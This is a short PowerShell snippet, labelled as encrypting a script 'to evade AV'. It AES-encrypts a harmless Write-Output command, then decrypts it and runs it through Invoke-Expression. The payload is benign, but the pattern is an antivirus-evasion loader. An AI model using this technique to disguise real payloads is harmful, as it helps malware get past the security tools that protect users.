# Encrypting the script to evade AV
$key = (1..16) | ForEach-Object {Get-Random -Maximum 256}
$iv = (1..16) | ForEach-Object {Get-Random -Maximum 256}

$plaintext = "Write-Output 'Encrypted Execution!'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($plaintext)

$Aes = [System.Security.Cryptography.Aes]::Create()
$Aes.Key = $key
$Aes.IV = $iv

$encryptor = $Aes.CreateEncryptor()
$encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)

$encoded = [Convert]::ToBase64String($encrypted)

# Decrypt and execute
$decryptor = $Aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$command = [System.Text.Encoding]::Unicode.GetString($decrypted)
Invoke-Expression $command
